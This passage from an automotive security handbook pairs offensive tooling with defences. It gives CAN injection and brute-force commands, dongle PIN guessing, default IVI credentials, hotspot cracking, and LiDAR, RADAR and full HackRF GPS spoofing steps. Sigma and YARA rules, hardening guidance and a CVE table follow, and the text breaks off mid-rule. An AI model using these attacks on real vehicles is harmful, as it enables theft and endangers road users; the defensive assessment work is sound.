# Set up CANtact as SocketCAN interface
sudo slcand -o -c -s6 /dev/ttyACM0 slcan0
# -s6 = 500 kbps (standard OBD-II CAN speed)
sudo ip link set slcan0 up

# Alternative: native SocketCAN adapter (PEAK PCAN-USB, Kvaser Leaf)
sudo ip link set can0 type can bitrate 500000
sudo ip link set can0 up

# Dump all CAN traffic
candump slcan0

# Send raw CAN frame (requires understanding of target vehicle's IDs)
cansend slcan0 7DF#0201050000000000
# 7DF = broadcast diagnostic ID
# 02 01 05 = Mode 01, PID 05 (coolant temp), 2-byte payload

# Brute-force PID enumeration (authorized testing only)
for pid in $(seq 0 255); do
  hex=$(printf "%02X" $pid)
  cansend slcan0 "7DF#0201${hex}0000000000"
  sleep 0.05
done | candump slcan0 -t a &
```

### 9B.3 Aftermarket dongle exploitation

```bash
# Bluetooth dongle discovery
hcitool scan           # Look for "OBDII", "ELM327", "Vgate"
bluetoothctl
[bluetooth]# pair AA:BB:CC:DD:EE:FF   # Try PINs: 0000, 1234, 6789
rfcomm connect hci0 AA:BB:CC:DD:EE:FF 1
# Issue AT commands per §2.4 — check if arbitrary CAN IDs accepted

# Wi-Fi dongle (iOS-targeted): connect to AP ("WiFi_OBDII")
nc 192.168.0.10 35000   # Default IP/port, AT commands over TCP
```

### 9B.4 OBD-II port lockdown

Four defense layers: (1) **Physical lock** — OBD Saver / Port-Lock covering J1962, proprietary key for removal ($30-50). (2) **Gateway session gating** (§2.4) — forwarding disabled unless cloud-authenticated token presented. Adopted by BMW (2020+), Mercedes (2021+), Stellantis (2023+). (3) **OBD-II firewall dongle** — inline device whitelisting only 0x7DF-0x7EF, blocking non-diagnostic IDs (Intrepid OBD Guard, AutoCyb CAN Firewall). (4) **Fleet policy** — audit all OBD-II devices during inspections, maintain authorized dongle inventory (MAC/serial), require mutual authentication on wireless devices.

---

## 9C. Infotainment Exploitation

Building on §4 (IVI architecture, OS-specific attack surface, TCU cellular exploitation), this section covers practical exploitation tooling.

### 9C.1 QNX/Linux head unit attack surface enumeration

```bash
# If SSH/serial console is obtained on a QNX-based head unit:
pidin ar          # List all running processes (QNX equivalent of ps)
pidin mem         # Memory usage per process
slay -9 <pid>     # Kill process (QNX)
ls /dev/can*      # Check for CAN device nodes
cat /etc/passwd   # User accounts (often default/empty passwords)
ls /net/          # QNX distributed filesystem — reveals other nodes
                  # in the QNX network (may expose other ECUs running QNX)

# If SSH/serial console on Linux-based IVI (AGL, custom):
ps aux | grep -E "can|obd|vhal|vehicle"   # Vehicle-bus processes
ip link show type can                      # SocketCAN interfaces
cat /proc/net/can/stats                    # CAN bus statistics
dmesg | grep -i "can\|mcp251\|spi"        # CAN controller driver info
ls -la /dev/spi* /dev/i2c*                 # SPI/I2C buses (CAN transceiver)
ss -tlnp                                   # Listening TCP services
cat /etc/smack/accesses.d/*               # SMACK MAC policy (AGL)
```

### 9C.2 ADB/SSH debug port discovery

```bash
# ADB over USB (Android Automotive):
adb devices && adb shell getprop | grep -i "build\|vehicle\|vhal"
adb shell dumpsys car_service   # Car service status
adb shell pm list packages      # Installed packages

# ADB over Wi-Fi (some head units expose TCP 5555):
nmap -p 5555 192.168.1.0/24 && adb connect 192.168.1.x:5555

# SSH on internal network (TCU + head unit often share 10.x subnet):
nmap -sV -p 22,2222,8022 10.0.0.0/24
# Default creds: root/root, root/(empty), debug/debug
```

### 9C.3 Wi-Fi and Bluetooth exploitation

```bash
# Wi-Fi AP attack (most IVI systems run a passenger hotspot):
iwlist wlan0 scan | grep -A5 "SSID"   # Common: "<Make>_WiFi"
# Some OEMs derive WPA2-PSK from VIN (publicly obtainable)
aircrack-ng -w wordlist.txt capture.cap
# Once connected, scan internal services:
nmap -sV -p- 192.168.1.1   # HTTP(8080), MQTT(1883), D-Bus(6667)

# Bluetooth service enumeration:
sdptool browse AA:BB:CC:DD:EE:FF      # SPP may give shell access
gatttool -b AA:BB:CC:DD:EE:FF --primary
gatttool -b AA:BB:CC:DD:EE:FF --characteristics
# Vehicle BLE services may expose unauthenticated control chars
```

### 9C.5 USB media parsing vulnerabilities

IVI media players parse USB-supplied MP3 (ID3 tags), JPEG/PNG (album art), video codecs, and playlists. Malformed files trigger buffer overflows in parser libraries (GStreamer, FFmpeg). Fuzz with: oversized ID3v2 tag fields, malformed EXIF/ICC profiles, oversized M3U path entries. Leverage known CVEs for the target media framework (e.g., CVE-2022-2566 FFmpeg heap overflow via crafted MOV).

### 9C.6 CAN pivot from infotainment

Once root is obtained on the IVI, the path to CAN bus depends on the hardware:

```bash
# On Linux-based IVI with SocketCAN:
ip link show type can
# If can0 exists: direct CAN access via the IVI's CAN transceiver
candump can0                   # Listen to CAN traffic
cansend can0 7DF#020105        # Send diagnostic request

# On QNX-based IVI:
ls /dev/can*                   # CAN device nodes
cat /dev/can0/rx               # Read CAN frames (QNX resource manager)

# On Android Automotive:
# CAN access is mediated by VHAL — direct CAN requires root + bypassing
# SELinux policy or accessing the SPI bus directly:
cat /dev/spidev0.0             # SPI bus to CAN transceiver (if accessible)
```

The gateway filtering (§1.2) is the critical defense at this point. A well-configured gateway drops any non-whitelisted frame originating from the infotainment CAN port, limiting damage to infotainment-domain functions (ambient lighting, HVAC) even if the IVI is fully compromised.

---

## 9D. ADAS Sensor Attacks

Building on §7 (LiDAR/camera/RADAR/ultrasonic attack theory and hardware lists), this section covers operational attack tooling.

### 9D.1 LiDAR spoofing — operational setup

Hardware per §7.1. Operational steps: (1) Identify target wavelength — 905 nm (Velodyne, Ouster, Hesai) or 1550 nm (Luminar, Aeva); select matching laser diode and optical filter. (2) FPGA synchronization: detect incoming pulses (APD → comparator → capture register), retransmit with programmable delay. Delay = (2 x phantom_distance) / c; phantom at 30m = 200 ns. (3) Aiming: collimated beam must hit receiver aperture. At 20m, 5 mrad divergence = 10 cm spot. Use visible-light co-aligned laser for alignment. (4) Point density: inject 50+ points per scan, sweeping across FOV during scan rotation. (5) Validate by monitoring perception output (test vehicle) or behavioral response.

### 9D.2 Camera adversarial patches — operational deployment

Building on §7.2 adversarial patch generation. Operational checklist:

1. **Target model identification**: identify ADAS camera system (Mobileye EyeQ version, Tesla Vision, Bosch MPC3) and detection model. Black-box transfer attacks use surrogate ensembles (multiple YOLO + Faster-RCNN variants trained on COCO/BDD100K).
2. **Patch generation** (§7.2 PyTorch code): optimize using EoT across viewing angles (-60 to +60 azimuth), distances (10-80m), lighting (100-50000 lux), and weather (clear/rain/fog augmentation).
3. **Printing**: high-resolution inkjet (300+ DPI) on weatherproof vinyl. CMYK gamut may not reproduce exact RGB optimization values — color calibration critical. UV-resistant lamination for outdoor durability.
4. **Placement**: on sign surface, road surface, or vehicle body panels. Typical size: 30x30 cm for signs, larger for road surfaces.

### 9D.3 RADAR jamming

Source: TI IWR1443 or AWR1642 evaluation module configured as CW transmitter at 77 GHz (~12 dBm EIRP) with directional horn antenna. Effect: raises victim noise floor 20-30 dB, reducing detection range from ~200m to <30m. Assessment at 10-50m: verify ACC disengages (safe failure) vs. reporting no targets (dangerous — may accelerate into obstacle). Defense verification: sensor fault detection should trigger within 100-500 ms, escalate to audible + visual driver alert, and degrade gracefully (reduce speed, return control to driver).

### 9D.4 GPS spoofing with gps-sdr-sim + HackRF

GPS spoofing targets the GNSS receiver in the IVI/TCU and in V2X-equipped vehicles (affecting BSM generation, §8.3).

```bash
# Generate GPS spoofing signal using gps-sdr-sim
# (https://github.com/osqzss/gps-sdr-sim)

# Step 1: Create RINEX navigation file or use broadcast ephemeris
wget -q "https://cddis.nasa.gov/archive/gnss/data/daily/2026/brdc/brdc1280.26n.gz"
gunzip brdc1280.26n.gz

# Step 2: Generate IQ samples for spoofed location
# Spoof location: 40.7128°N, 74.0060°W (New York City)
gps-sdr-sim -e brdc1280.26n -l 40.7128,-74.0060,10 -o gps_spoof.bin -b 8

# -e : ephemeris file
# -l : target lat,lon,alt
# -o : output IQ file
# -b : bit depth (8 for HackRF)

# Step 3: Transmit via HackRF
hackrf_transfer -t gps_spoof.bin -f 1575420000 -s 2600000 -a 1 -x 0

# -f 1575420000 : GPS L1 frequency (1575.42 MHz)
# -x 0          : minimum TX power (increase cautiously)
#
# WARNING: GPS spoofing is illegal in most jurisdictions
# (18 USC §32 in the US, various national radio regulations).
# Conduct only in RF-shielded environments or with explicit
# government/military authorization.

# Step 4: Dynamic spoofing (vehicle in motion)
# Generate a route using NMEA waypoints:
gps-sdr-sim -e brdc1280.26n -u waypoints.csv -o gps_route.bin -b 8
# waypoints.csv: time,lat,lon,alt (one row per second)
```

Impact: navigation misdirection, V2X BSM position falsification (§8.5), geofence bypass, timestamp manipulation (V2X freshness, Uptane verification).

### 9D.5 Sensor fusion bypass strategy

Multi-modal attacks must create consistent stimuli across sensors (§7.5). To create a phantom vehicle at 40m moving at 60 km/h: LiDAR injection (§9D.1, delay = 267 ns for 40m, 100+ points), camera projection (vehicle silhouette via high-lumen projector, §7.2), and RADAR retransmission (Δt = 267 ns, Δf per §7.3 for 60 km/h encoding). Must sustain across 10+ frames (1 second at 10 Hz) with physically plausible trajectory (§7.5). This is the highest-complexity automotive sensor attack — single-modality attacks are far more practical.

---

## 9E. Detection

### 9E.1 Sigma rules

```yaml
# SIGMA Rule 1: OBD-II Unauthorized Access Attempt
title: OBD-II Unauthorized Diagnostic Session
id: a1b2c3d4-5678-9abc-def0-111213141516
status: experimental
description: >
  Detects UDS DiagnosticSessionControl or SecurityAccess requests
  originating from the OBD-II port outside of a legitimate
  diagnostic session (no prior cloud authentication token).
logsource:
  category: vehicle_gateway
  product: automotive_ids
detection:
  selection:
    source_port: OBD_DIAG
    can_id|startswith:
      - '0x7DF'
      - '0x7E'
    uds_service:
      - 0x10  # DiagnosticSessionControl
      - 0x27  # SecurityAccess
      - 0x34  # RequestDownload
      - 0x36  # TransferData
  filter:
    diag_session_authenticated: true
  condition: selection and not filter
level: high
tags:
  - attack.initial_access
  - attack.t0871    # Automotive ATT&CK: Exploit OBD-II
falsepositives:
  - Legitimate dealer diagnostic session (should have auth token)
  - Emissions testing equipment (state inspection stations)

---
# SIGMA Rule 2: Key Fob Rolling Code Replay Detected
title: Key Fob Rolling Code Counter Regression
id: b2c3d4e5-6789-abcd-ef01-212223242526
status: experimental
description: >
  Detects reception of a valid rolling code with a counter value
  equal to or less than the last accepted code, indicating a
  potential RollJam replay. Also triggers on reception of a
  previously-seen code that was jammed (captured by RollJam device
  but not received by the vehicle — now replayed).
logsource:
  category: vehicle_body_control
  product: bcm_keyfob_log
detection:
  selection:
    event_type: keyfob_auth
    result: accepted
  condition_regression:
    rolling_code_counter|lte: last_accepted_counter
  condition_replay:
    rolling_code_counter: previously_captured_but_not_accepted
  condition: selection and (condition_regression or condition_replay)
level: critical
tags:
  - attack.credential_access
falsepositives:
  - Counter desync from fob pressed out of range many times
    (BCM accepts codes within a forward window of ~256 presses)

---
# SIGMA Rule 3: Infotainment-to-CAN Pivot Detected
title: CAN Frame from Infotainment Domain with Non-Infotainment ID
id: c3d4e5f6-789a-bcde-f012-313233343536
status: experimental
description: >
  Detects CAN frames originating from the infotainment CAN port
  with arbitration IDs outside the infotainment-allowed range.
  Indicates a compromised IVI attempting to inject messages onto
  powertrain, chassis, or ADAS buses via the gateway.
logsource:
  category: vehicle_gateway
  product: automotive_ids
detection:
  selection:
    source_port: INFOTAINMENT
  filter_allowed:
    can_id|range:
      - '0x400-0x4FF'   # Hypothetical infotainment-allowed range
  condition: selection and not filter_allowed
level: critical
tags:
  - attack.lateral_movement
  - attack.t0880    # Automotive ATT&CK: CAN injection
falsepositives:
  - Misconfigured gateway forwarding rule (should be fixed, not filtered)
```

### 9E.2 YARA rules

```yara
rule Automotive_ECU_Backdoor_Strings
{
    meta:
        description = "Detects suspicious strings in ECU firmware dumps indicating backdoor or debug access"
        author = "Vehicle Security Assessment"
        date = "2026-05-09"
        severity = "high"

    strings:
        $debug1 = "debug_shell" ascii nocase
        $debug2 = "backdoor" ascii nocase
        $debug3 = "test_mode" ascii nocase
        $debug4 = "factory_reset" ascii nocase
        $cred1  = "root:$" ascii           // Shadow-format password hash
        $cred2  = "admin:admin" ascii
        $cred3  = "password" ascii nocase
        $uds1   = { 27 01 }               // SecurityAccess requestSeed (raw bytes)
        $uds2   = { 27 02 }               // SecurityAccess sendKey
        $sa_weak = /seed\s*\^\s*0x[0-9A-Fa-f]+/ ascii  // XOR-based seed-key algorithm
        $ssh_key = "-----BEGIN RSA PRIVATE KEY-----" ascii
        $ssh_key2 = "-----BEGIN OPENSSH PRIVATE KEY-----" ascii

    condition:
        any of ($debug*) or
        any of ($cred*) or
        any of ($ssh_key*) or
        ($uds1 and $sa_weak) or
        (#uds1 > 5 and #uds2 > 5)   // Excessive SecurityAccess pairs
}

rule Automotive_Firmware_Unsigned_Update
{
    meta:
        description = "Detects firmware update packages lacking cryptographic signatures"
        author = "Vehicle Security Assessment"
        date = "2026-05-09"
        severity = "critical"

    strings:
        $fw_header1 = "FWUPDATE" ascii
        $fw_header2 = { 89 46 57 55 }     // Custom firmware magic bytes
        $fw_header3 = "UPD_IMG" ascii
        $sig_rsa    = { 30 82 }            // ASN.1 sequence (RSA signature)
        $sig_ecdsa  = { 30 44 02 20 }      // ECDSA P-256 signature DER
        $sig_ecdsa2 = { 30 45 02 20 }
        $sig_ecdsa3 = { 30 46 02 21 }
        $uptane     = "signed" ascii
        $tuf_meta   = "\"_type\": \"targets\"" ascii nocase

    condition:
        any of ($fw_header*) and
        not any of ($sig_rsa, $sig_ecdsa*, $uptane, $tuf_meta) and
        filesize < 100MB
}
```

### 9E.3 VSOC architecture

The Vehicle Security Operations Center (VSOC) aggregates fleet telemetry for centralized monitoring. Four-layer architecture: **Vehicle layer** (gateway IDS §1.5, IVI/TCU IDS, ADAS anomaly detector) sends encrypted telemetry via cellular. **Ingestion layer** (MQTT/Kafka broker for vehicle streams, syslog/CEF for fleet management, OCPP events for charging §9). **Analytics layer** (SIEM normalization, ML anomaly detection baselined per VIN, cross-vehicle correlation, automotive CVE threat intel). **Response layer** (SOC analyst triage, automated OTA policy push, fleet-wide IOC scan, escalation to OEM engineering / law enforcement / NHTSA).

VSOC platforms: Upstream Security, Argus (Continental), C2A Security, Karamba Security. UNECE WP.29 R155 (effective July 2024 for new vehicle types) mandates CSMS with VSOC-equivalent monitoring for all type-approved vehicles in UNECE markets.

### 9E.4 AUTOSAR IdsM (Intrusion Detection System Manager)

AUTOSAR Adaptive Platform specifies the IdsM module for in-vehicle intrusion detection. Security Event Providers (SEPs) — CAN IDS, Ethernet IDS (SOME/IP, DoIP), Host IDS (process/file integrity), SecOC Failure Reporter — feed SecurityEvent reports to the IdsM, which applies filtering, aggregation, and threshold qualification. Events are transmitted off-board via UDS ReadDTCInformation or DoIP/SOME/IP streaming to the VSOC, and stored in NVRAM for post-incident forensics.

AUTOSAR event categories: `IDSM_EVENT_CATEGORY_COMM` (communication anomalies), `IDSM_EVENT_CATEGORY_CRYPTO` (SecOC failures), `IDSM_EVENT_CATEGORY_ACCESS` (unauthorized access), `IDSM_EVENT_CATEGORY_SYSTEM` (OS/platform integrity violations).

---

## 9F. Hardening

### 9F.1 Key fob: UWB transition

UWB (§3.4) is the definitive relay defense. Roadmap: **Immediate** — enable motion-sensor sleep on PKE fobs (§3.5), enforce PIN-to-Drive, Faraday pouches. **Mid-term** — deploy CCC Digital Key 3.0 with UWB ranging (iPhone/Android UWB). **Long-term** — phase out 125 kHz LF-based PKE; all passive entry via UWB + BLE.

### 9F.2 OBD-II firewall and session gating

Deploy inline OBD-II firewall (§9B.4) whitelisting Mode 01-09 and blocking UDS write services (0x27, 0x2E, 0x34, 0x36) without cloud-authenticated session token. Implement session-gated access (§2.4) — adopted by BMW (2020+), Mercedes (2021+), Stellantis (2023+). Disable OBD-II port pin 16 battery power when vehicle is locked via BCM-controlled relay.

### 9F.3 Infotainment isolation

Hypervisor-based separation (QNX Hypervisor, ETAS RTA-HVR) isolating safety-critical from infotainment guests (§4.2). Dedicated VLANs per domain with MACsec on Automotive Ethernet (§1.5). Disable SSH/ADB/D-Bus TCP in production firmware; enforce SELinux/SMACK enforcing mode. AAOS: restrict safety-critical VehicleProperty writes (DOOR_LOCK, AP_POWER_STATE_REQ) to platform-signed system apps.

### 9F.4 ADAS redundancy and sensor hardening

No safety-critical decision on single-modality input (§7.5). Require 5+ consecutive frames before ADAS response (eliminates single-frame phantoms). Deploy LiDAR pulse fingerprinting (§7.1), RADAR chirp randomization (§7.3), and adversarial training with PGD/patch augmentation (§7.5).

### 9F.5 V2X PKI and misbehavior detection

Deploy SCMS with RA-PCA split (§8.4). Pseudonym rotation every 5 minutes, pool of ~20/week. OBU-level kinematic plausibility checks on every received BSM (§8.6). Delta-CRL distribution for bandwidth efficiency. Cross-reference BSM claims against own sensor detections.

### 9F.6 EV charging TLS and firmware signing

OCPP 2.0.1 Profile 3: mandatory mutual TLS, no Profile 1 in production (§9.1). ISO 15118-20: mandatory TLS 1.3 with mutual auth (§9.3). All CP firmware updates signed (ECDSA/RSA) with rollback protection via monotonic version counter. HomePlug GreenPHY AES-128 encryption on CP wire. Physical tamper detection: intrusion sensors on EVSE enclosures, CSMS alerting on cabinet events.

---

## 9G. CVE and Disclosure Table

| ID | Year | Target | Description | CVSS | CWE | Impact |
|---|---|---|---|---|---|---|
| CVE-2022-27254 | 2022 | Honda Civic (2016-2020) | Key fob fixed-code replay: RKE system transmitted identical RF signal for lock/unlock, enabling capture and replay without rolling-code protection | 7.5 | CWE-294 | Unauthorized vehicle unlock |
| CVE-2023-29389 | 2023 | Toyota RAV4 | CAN bus injection via headlamp ECU: attacker with physical access to headlamp wiring injected CAN frames accepted by body control module, unlocking doors and starting engine | 6.8 | CWE-306 | Vehicle theft via CAN injection |
| CVE-2016-9862 | 2016 | Tesla Model S (< 7.1 2016.36.0) | WebKit use-after-free in CID browser enabling remote code execution via malicious web page served over Wi-Fi captive portal | 8.8 | CWE-416 | RCE on infotainment → CAN pivot (§5.2) |
| CVE-2016-9863 | 2016 | Tesla Model S (< 7.1 2016.36.0) | Linux kernel local privilege escalation on CID, escalating from browser sandbox to root | 7.8 | CWE-269 | Root on CID → gateway reflash (§5.2) |
| CVE-2016-9864 | 2016 | Tesla Model S (< 7.1 2016.36.0) | Gateway accepted unsigned firmware from CID without cryptographic verification | 9.8 | CWE-345 | Full vehicle CAN bus control (§5.2) |
| CVE-2021-22156 | 2021 | QNX SDP 6.6 / 7.0 (BadAlloc) | Integer overflow in C runtime memory allocator enabling potential RCE via controlled allocation size | 9.8 | CWE-190 | RCE on QNX-based IVI/instrument clusters (§4.2) |
| Disclosed 2015 | 2015 | Jeep Cherokee (Uconnect/Harman) | Unauthenticated D-Bus on TCP 6667 over cellular → root shell → CAN injection → EPS reflash → remote steering/braking. Miller and Valasek, Black Hat USA 2015. 1.4M vehicle recall (NHTSA 15V-461) | N/A | CWE-306, CWE-78 | Full remote vehicle control (§5.1) |
| Disclosed 2015 | 2015 | BMW ConnectedDrive (2.2M vehicles) | Static shared symmetric key for TLS, identical across model generation. ADAC extracted key via firmware analysis, MitM'd cellular connection, issued remote unlock | N/A | CWE-321 | Remote door unlock fleet-wide (§5.3) |
| Disclosed 2015 | 2015 | GM OnStar RemoteLink | Samy Kamkar (OwnStar): intercepted OnStar RemoteLink mobile app communication via rogue Wi-Fi, capturing auth tokens. Enabled remote unlock, start, and locate for any OnStar-equipped vehicle | N/A | CWE-319 | Remote unlock/start/locate |
| Disclosed 2016 | 2016 | VW Group immobilizer (Megamos Crypto) | Garcia et al., USENIX Security: HITAG2 48-bit key recovered from 4 authentication traces in < 1 min compute. Enabled transponder cloning for engine immobilizer bypass across VW, Audi, Seat, Skoda | N/A | CWE-327 | Immobilizer bypass → engine start |
| Disclosed 2022 | 2022 | Hyundai/Kia (8.3M vehicles, 2011-2022) | Missing electronic immobilizer on base trims. USB connector in ignition switch housing turned with any USB-A plug. NHTSA campaigns 22V-893/22V-894 | N/A | CWE-306 | Vehicle theft at scale (§5.5) |
| CVE-2023-27163 | 2023 | ChargePoint Home Flex (EVSE) | SSRF vulnerability in EVSE web management interface allowing internal network access from charging station | 6.5 | CWE-918 | Network pivot from EVSE |
| Disclosed 2022 | 2022 | Tesla Model 3/Y BLE relay | NCC Group (Sultan Qasim Khan): BLE link-layer relay over arbitrary distance, 8 ms latency within 30 ms timeout. Unlocks and enables drive without physical key/phone proximity | N/A | CWE-294 | Unauthorized unlock + drive (§3.3) |

"Disclosed YYYY" entries are research disclosures or NHTSA campaigns without formal CVE identifiers. Cross-references (§) point to detailed case studies within this chapter.

---

## 10. Vehicle Attack Detection Engineering

> **Scope boundary.** For CAN-frame-level anomaly detection (unknown arbitration IDs, UDS brute-force, clock-skew fingerprinting), see Chapter 21A §11D. This section covers vehicle-attack-level detection patterns that operate above the CAN layer — targeting OBD-II tool abuse, key fob relay indicators, infotainment compromise, OTA tampering, ADAS sensor spoofing, V2X forgery, and charging infrastructure MITM.

### 10.1 Detection rule set

**Rule 1: Unauthorized OBD-II access patterns.**

```yaml
title: Unauthorized OBD-II Diagnostic Tool Access
id: veh-atk-001
status: stable
description: >
    Detects OBD-II diagnostic session initiation (UDS DiagnosticSessionControl
    0x10, subfunction 0x02/0x03 for Programming/ExtendedDiagnostic) outside of
    authorized maintenance windows. Correlates with ignition state: diagnostic
    sessions while the vehicle is in motion or parked outside a known service
    facility indicate unauthorized tool attachment.
severity: high
data_sources:
    - gateway_log: UDS requests on diagnostic bus (0x7DF, 0x7E0-0x7E7)
    - vehicle_state: ignition_on, speed > 0, GPS coordinates
    - fleet_mgmt: maintenance_schedule database
detection:
    condition: |
        uds.service_id == 0x10 AND
        uds.subfunction IN [0x02, 0x03] AND
        (vehicle.speed > 0 OR vehicle.location NOT IN authorized_facilities) AND
        NOT maintenance_window.active
    threshold:
        count: 1
        timeframe: instant
action:
    - alert: "OBD-II programming session initiated outside maintenance window"
    - log_to: vehicle_siem
    - escalate_if: "followed by SecurityAccess (0x27) within 30s → Active ECU attack"
    - response: "Enable DTC freeze frame capture, log all subsequent UDS traffic"
mitre_attack: T0803 (Block Command Message), T0855 (Unauthorized Command Message)
references:
    - §2 OBD-II attack surface
    - Chapter 21A §7 UDS services
```

**Rule 2: CAN message injection rate/timing anomalies.**

```yaml
title: CAN Message Injection Timing Anomaly
id: veh-atk-002
status: stable
description: >
    Detects CAN frames that violate the expected periodic transmission
    schedule of known ECUs. Automotive ECUs transmit on fixed periods
    (e.g., engine RPM every 10 ms). An injected frame arrives at an
    offset that breaks the expected inter-arrival time (IAT). This rule
    complements Chapter 21A can-ids-001 by focusing on timing rather
    than ID whitelisting.
severity: critical
data_sources:
    - can_bus_monitor: per-ID timestamp tracking
    - baseline_profile: IAT mean and std_dev per arbitration ID
detection:
    condition: |
        frame.iat_delta < (baseline[frame.id].mean - 3 * baseline[frame.id].std_dev) OR
        frame.iat_delta > (baseline[frame.id].mean + 3 * baseline[frame.id].std_dev)
    sustained: 5 consecutive anomalous frames
    bus_segment: powertrain | chassis | ADAS
action:
    - alert: "IAT anomaly on ID 0x{frame.id}: expected {baseline.mean}ms, observed {frame.iat_delta}ms"
    - log_to: SecM + vehicle_siem
    - escalate_if: "anomaly sustained > 2s → Active CAN injection attack"
    - response: "Capture full bus dump for 30s, flag for forensic analysis"
references:
    - §1.3 gateway bypass → injection path
    - Chapter 21A §4.3 CAN injection attacks
```

**Rule 3: Key fob relay attack RF indicators.**

```yaml
title: Key Fob Relay Attack Detection via UWB/BLE Ranging
id: veh-atk-003
status: stable
description: >
    Detects potential relay attacks by comparing BLE RSSI profile with
    UWB Time-of-Flight (ToF) distance measurement. In a relay attack,
    BLE RSSI indicates proximity (relayed signal appears strong), but
    UWB ToF reveals the actual physical distance exceeds the BLE-implied
    range. Discrepancy > 2 meters triggers alert. For vehicles without
    UWB, fallback to BLE RSSI rate-of-change analysis: a legitimate
    approaching key shows gradual RSSI increase over 3-10 seconds;
    a relay activates within < 500 ms from absent to full-strength.
severity: high
data_sources:
    - ble_ranging: RSSI per advertisement interval (100 ms)
    - uwb_ranging: ToF distance measurement (if equipped)
    - vehicle_state: door_handle_touch_event, pke_auth_request
detection:
    condition_uwb: |
        abs(uwb.distance - ble.estimated_distance) > 2.0 meters AND
        pke_auth_request.pending == true
    condition_ble_only: |
        ble.rssi_delta > 30 dBm within 500 ms AND
        ble.previous_state == "absent" AND
        pke_auth_request.pending == true
action:
    - alert: "Potential relay attack: BLE/UWB distance mismatch {uwb.distance}m vs {ble.est}m"
    - block: "Delay PKE authentication by 5s, require button press confirmation"
    - log_to: vehicle_siem
    - escalate_if: "3+ relay indicators in 24h at same location → Targeted attack"
references:
    - §3.3 BLE relay attacks
    - §3.5 UWB distance bounding
    - Disclosed 2022 Tesla Model 3/Y BLE relay (NCC Group)
```

**Rule 4: Infotainment unauthorized root access.**

```yaml
title: Infotainment System Root Shell Detection
id: veh-atk-004
status: stable
description: >
    Detects indicators of unauthorized root access on IVI systems:
    (1) process execution from /tmp or /dev/shm, (2) new SUID binaries,
    (3) kernel module loading not in the signed allowlist, (4) outbound
    network connections to non-OEM endpoints from the IVI, (5) D-Bus
    service registration with privileged system bus names not in the
    baseline manifest.
severity: critical
data_sources:
    - ivi_audit_log: execve, module_load, socket_connect, dbus_service_register
    - baseline: signed_binary_hashes, approved_network_endpoints, dbus_service_manifest
detection:
    condition: |
        (process.exe_path STARTS_WITH "/tmp" OR "/dev/shm" OR "/var/tmp") OR
        (file.suid_bit_set AND file.sha256 NOT IN baseline.signed_hashes) OR
        (kernel.module_load AND module.signature NOT IN baseline.approved_modules) OR
        (network.dst_ip NOT IN baseline.oem_endpoints AND network.initiated_by == "ivi") OR
        (dbus.service_name NOT IN baseline.dbus_manifest AND dbus.bus == "system")
action:
    - alert: "IVI root compromise indicator: {detection.trigger_detail}"
    - isolate: "Firewall IVI from CAN gateway (drop all forwarded frames)"
    - log_to: vehicle_siem + OEM security operations center
    - response: "Capture IVI memory dump, preserve /var/log, snapshot filesystem"
mitre_attack: T0826 (Loss of Availability), T0831 (Manipulation of Control)
references:
    - §4 Infotainment attack chains
    - §5.1 Jeep Cherokee Uconnect compromise
    - CVE-2016-9862 Tesla CID WebKit RCE
```

**Rule 5: OTA update tampering indicators.**

```yaml
title: OTA Update Integrity Violation
id: veh-atk-005
status: stable
description: >
    Detects OTA update anomalies indicating tampering or rollback attack:
    (1) metadata signature verification failure, (2) image hash mismatch
    between Director and Image repository metadata (Uptane dual-check),
    (3) metadata timestamp older than vehicle's last known good time
    (freeze attack detection), (4) ECU firmware version downgrade
    attempt (rollback), (5) unexpected update source IP/domain not
    matching OEM CDN.
severity: critical
data_sources:
    - uptane_client: metadata_verification_log, image_hash_log
    - tcu_network: dns_queries, tls_connections during OTA
    - ecu_version_db: current_firmware_versions per ECU
detection:
    condition: |
        (uptane.metadata_sig_verify == FAIL) OR
        (uptane.director_hash != uptane.image_repo_hash) OR
        (uptane.metadata_timestamp < vehicle.secure_clock - 48h) OR
        (ecu.proposed_version < ecu.current_version AND NOT oem_rollback_authorized) OR
        (ota.source_domain NOT IN oem_cdn_allowlist)
action:
    - block: "Abort OTA installation immediately"
    - alert: "OTA tampering detected: {detection.trigger_detail}"
    - log_to: vehicle_siem + OEM SOC
    - response: "Quarantine downloaded image, preserve for forensic analysis"
    - escalate_if: "metadata timestamp deviation > 7 days → Active freeze attack"
references:
    - §6 OTA update security
    - §6.3 Uptane framework
```

**Rule 6: ADAS sensor spoofing detection.**

```yaml
title: ADAS Sensor Spoofing Anomaly
id: veh-atk-006
status: stable
description: >
    Detects potential sensor spoofing attacks on ADAS by correlating
    multi-sensor inputs. LiDAR spoofing (§7.1) injects ghost objects
    that appear in LiDAR point cloud but not in camera or RADAR.
    Camera blinding (§7.2) causes perception dropout that LiDAR/RADAR
    do not confirm. Cross-sensor consistency checks flag when a single
    sensor reports objects or conditions that other sensors contradict.
severity: critical
data_sources:
    - adas_fusion: per-sensor object lists, confidence scores
    - lidar_raw: point_cloud statistics (point density, return intensity)
    - camera_raw: exposure level, saturation percentage
    - radar_raw: target list, doppler consistency
detection:
    condition: |
        (lidar.object_count > 0 AND radar.correlated_objects == 0 AND
         camera.correlated_objects == 0 AND lidar.return_intensity_std < 0.05) OR
        (camera.saturation_percentage > 80% AND lidar.ambient_light_normal AND
         radar.target_list_stable) OR
        (radar.ghost_target_count > 3 AND lidar.correlated == 0)
    sustained: 500 ms
action:
    - alert: "ADAS sensor spoofing: {sensor} reports uncorrelated {object_type}"
    - degrade: "Reduce ADAS autonomy level, alert driver to assume control"
    - log_to: vehicle_siem + ADAS event recorder
    - response: "Record 30s raw sensor data from all modalities"
references:
    - §7.1 LiDAR spoofing
    - §7.2 camera saturation/adversarial patches
    - §7.4 RADAR interference
    - §7.5 multi-sensor fusion attacks
```

**Rule 7: V2X message forgery detection.**

```yaml
title: V2X Basic Safety Message Forgery
id: veh-atk-007
status: stable
description: >
    Detects forged or Sybil V2X Basic Safety Messages (BSMs) using
    misbehavior detection heuristics: (1) BSM position inconsistent
    with sender's claimed heading and speed (kinematic plausibility),
    (2) BSM certificate not in the current valid SCMS epoch,
    (3) multiple BSMs from distinct pseudonym certificates claiming
    overlapping physical positions (Sybil indicator), (4) BSM
    transmission rate deviating from SAE J2945/1 spec (10 Hz ± 1 Hz).
severity: high
data_sources:
    - v2x_stack: received_bsms, certificate_validation, scms_crl
    - vehicle_gnss: own_position for plausibility cross-check
    - v2x_misbehavior_authority: revocation list, reported certificates
detection:
    condition: |
        (bsm.claimed_speed > 0 AND
         distance(bsm.position[t], bsm.position[t-1]) NOT IN
         plausible_range(bsm.speed, bsm.heading, delta_t, tolerance=20%)) OR
